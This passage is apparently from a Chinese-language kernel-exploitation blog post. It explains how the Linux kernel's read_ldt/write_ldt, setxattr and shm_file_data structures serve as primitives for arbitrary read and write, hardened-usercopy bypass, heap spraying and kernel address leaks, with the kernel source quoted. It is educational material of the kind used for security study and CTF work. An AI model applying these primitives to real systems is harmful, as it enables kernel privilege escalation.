bytecount) &#123;</span><br><span class="line"><span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line"><span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retval = bytecount;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中两个常量宏的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE8</span></span><br></pre></td></tr></table></figure><p>重点看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们能够修改ldt结构的entries结构,便能够做到任意读</p><p>并且copy_from_user和copy_to_user的返回值均是未成功copy的数量,可以以此判断是否命中</p><h4 id="大范围搜索内存"><a href="#大范围搜索内存" class="headerlink" title="大范围搜索内存"></a>大范围搜索内存</h4><p>不过就算read_ldt能够帮助我们搜索内存,但是仍然无法完全避免<code>hardened usercopy</code>的影响</p><p>但观察 fork 系统调用的源码，我们可以发现如下执行链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure><p>ldt_dup_context() 定义于 <code>arch/x86/kernel/ldt.c</code> 中，逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>new_ldt-&gt;nr_entries</code>由<code>old_ldt-&gt;nr_entries</code>赋值</p><p>在这里会通过 memcpy 将父进程的 ldt-&gt;entries 拷贝给子进程，<strong>是完全处在内核中的操作</strong>,因此能够绕过<code>hardened usercopy</code>的检查</p><p>当父进程设置目标地址后,再打开子进程,便会将目标地址处的内容复制到子进程的ldt中,之后再使用read_ldt便能够直接读取</p><h3 id="write-ldt"><a href="#write-ldt" class="headerlink" title="write_ldt"></a>write_ldt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">error = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (oldmode)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">    LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line"><span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!IS_ENABLED(CONFIG_X86_16BIT) &amp;&amp; !ldt_info.seg_32bit) &#123;</span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line"><span class="keyword">if</span> (oldmode)</span><br><span class="line">ldt.avl = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line"><span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">error = -ENOMEM;</span><br><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line">finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment"> * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment"> * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment"> * them over to the new LDT.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment"> * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment"> * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">free_ldt_pgtables(mm);</span><br><span class="line">free_ldt_struct(new_ldt);</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">install_ldt(mm, new_ldt);</span><br><span class="line">unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">free_ldt_struct(old_ldt);</span><br><span class="line">error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们主要关注</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></figure><p><code>new_ldt</code>是新申请出来的object,在alloc之后memcpy之前有一个窗口期,若是我么能够在这期间竞争修改<code>new_ldt-&gt;entries</code>,那么便能够做到任意写,不过这个窗口期比较短,实际运用成功率较低</p><p>但我们还可以注意到<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>这一句,memcpy函数拷贝的长度是<code>old_nr_entries * LDT_ENTRY_SIZE</code></p><p>这个数据量相对较大,那么如果能够在memcpy函数执行的过程中通过竞争修改<code>new_ldt-&gt;entries</code>,也能够做到小范围的任意写</p><p>至于任意写的值其实也并不是完全受我们控制,不过可以根据我们传入的结构体,在一定程度上进行控制(具体可以看这个函数的完整流程)</p><p>我们<u>需要传入的结构体</u>的定义如下,新的ldt一定程度上受这个结构体控制,可以根据要求更改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS</span></span><br><span class="line"><span class="comment"> * not to the default values if you still want to do syscalls. This</span></span><br><span class="line"><span class="comment"> * call is more for 32bit mode therefore.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment"> * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment"> * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment"> * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment"> * actual value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="setxattr"><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h2><p><strong>申请obj大小:任意</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:堆占位</strong></p><p>观察 setxattr 源码，发现如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure><p>在 <code>setxattr()</code> 函数中有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容，之后该对象会被释放掉</strong></p><p>使用时按照以下格式,其中第一个字符串需要是本进程的文件路径,第二个字符串任意</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;abcdefg&quot;</span>, &amp;buf,len,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><strong>通常需要配合 userfaultfd 系统调用</strong>完成进一步的利用</p><h2 id="shm-file-data"><a href="#shm-file-data" class="headerlink" title="shm_file_data"></a>shm_file_data</h2><p><strong>申请obj大小:32</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:.text泄露</strong></p><p>这个结构体主要是用于泄露内核基址的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>大小为<code>0x20</code>,从kmalloc-32中分配</p><p>其中的 ns字段和vm_ops字段皆指向内核的<code>.text</code>段中</p><p>file字段位于内核线性映射区,能够泄露内核堆地址</p><p>有四个相关函数<code>shmget</code>、<code>shmat</code>、<code>shmctl</code>、<code>shmdt</code></p><h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>使用 <code>shmget</code> 系统调用可以获得一个共享内存对象，随后要使用 <code>shmat</code> 系统调用将共享内存对象映射到进程的地址空间</p><p><strong>shmget</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmget, <span class="type">key_t</span>, key, <span class="type">size_t</span>, size, <span class="type">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ksys_shmget(key, size, shmflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般这样调用,key可以是任意整型,返回一个shmid</p><p><code>shm_id = shmget(114514, 0x1000, SHM_R | SHM_W | IPC_CREAT);</code></p><p><strong>shmat</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmat, <span class="type">int</span>, shmid, <span class="type">char</span> __user *, shmaddr, <span class="type">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line"><span class="type">long</span> err;</span><br><span class="line"></span><br><span class="line">err = do_shmat(shmid, shmaddr, shmflg, &amp;ret, SHMLBA);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">force_successful_syscall_return();</span><br><span class="line"><span class="keyword">return</span> (<span class="type">long</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在do_shmat中会分配一个shm_file_data结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    file-&gt;private_data = sfd;</span><br></pre></td></tr></table></figure><h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p><code>shmdt</code> 系统调用用以断开与共享内存对象的连接，观察其源码，发现其会调用 <code>ksys_shmdt()</code> 函数，注意到如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYS_shmdt()</span><br><span class="line">    ksys_shmdt()</span><br><span class="line">        do_munmap()</span><br><span class="line">            remove_vma_list()</span><br><span class="line">                remove_vma()</span><br></pre></td></tr></table></figure><p>其中有着这样一条代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> vm_area_struct *<span class="title function_">remove_vma</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">next</span> =</span> vma-&gt;vm_next;</span><br><span class="line"></span><br><span class="line">    might_sleep();</span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close)</span><br><span class="line">        vma-&gt;vm_ops-&gt;close(vma);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>在这里调用了该 vma 的 vm_ops 对应的 close 函数，我们将目光重新放回共享内存对应的 vma 的初始化的流程当中，在 shmat() 中注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!sfd) &#123;</span><br><span class="line">        fput(base);</span><br><span class="line">        <span class="keyword">goto</span> out_nattch;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file = alloc_file_clone(base, f_flags,</span><br><span class="line">              is_file_hugepages(base) ?</span><br><span class="line">                &amp;shm_file_operations_huge :</span><br><span class="line">                &amp;shm_file_operations);</span><br></pre></td></tr></table></figure><p>在这里调用了 <code>alloc_file_clone()</code> 函数，其会调用 <code>alloc_file()</code> 函数将第三个参数赋值给新的 file 结构体的 f_op 域，在这里是 <code>shm_file_operations</code> 或 <code>shm_file_operations_huge</code>，定义于 <code>/ipc/shm.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * shm_file_operations_huge is now identical to shm_file_operations,</span></span><br><span class="line"><span class="comment"> * but we keep it distinct for the sake of is_file_shm_hugepages().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations_huge</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这里对于关闭 shm 文件，对应的是 <code>shm_release</code> 函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">shm_release</span><span class="params">(<span class="keyword">struct</span> inode *ino, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span> =</span> shm_file_data(file);</span><br><span class="line"></span><br><span class="line">    put_ipc_ns(sfd-&gt;ns);</span><br><span class="line">    fput(sfd-&gt;file);</span><br><span class="line">    shm_file_data(file) = <span class="literal">NULL</span>;</span><br><span class="line">    kfree(sfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即当我们进行 shmdt 系统调用时便可以释放 <code>shm_file_data</code> 结构体</p><h2 id="msg"><a href="#msg" class="headerlink" 